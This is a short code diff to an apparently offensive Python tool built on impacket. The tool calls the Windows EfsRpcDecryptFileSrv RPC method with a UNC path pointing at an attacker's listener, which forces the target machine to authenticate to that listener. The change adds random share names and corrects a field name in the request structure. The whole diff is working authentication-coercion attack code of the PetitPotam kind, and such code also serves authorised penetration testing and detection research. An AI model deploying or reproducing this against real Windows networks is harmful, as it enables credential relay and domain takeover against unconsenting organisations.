@@ -4,7 +4,7 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 22 Jun 2022
 
-
+import random
 import sys
 import argparse
 from impacket import system_errors
@@ -29,11 +29,19 @@ class DCERPCSessionError(DCERPCException):
             return 'SessionError: unknown error code: 0x%x' % self.error_code
 
 
+def gen_random_name(length=8):
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    name = ""
+    for k in range(length):
+        name += random.choice(alphabet)
+    return name
+
+
 class EfsRpcDecryptFileSrv(NDRCALL):
     opnum = 5
     structure = (
-        ('FileName', WSTR),  # Type: wchar_t *
-        ('long', LONG),      # Type: unsigned
+        ('FileName', WSTR),   # Type: wchar_t *
+        ('OpenFlag', ULONG),  # Type: unsigned
     )
 
 
@@ -114,8 +122,8 @@ class MS_EFSR(RPCProtocol):
             print("[>] Calling EfsRpcDecryptFileSrv() ...")
             try:
                 request = EfsRpcDecryptFileSrv()
-                request['FileName'] = '\\\\%s\\share\\file.txt\x00' % listener
-                request['long'] = 0
+                request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
+                request['OpenFlag'] = 0
                 # request.dump()
                 resp = self.dce.request(request)
             except Exception as e:
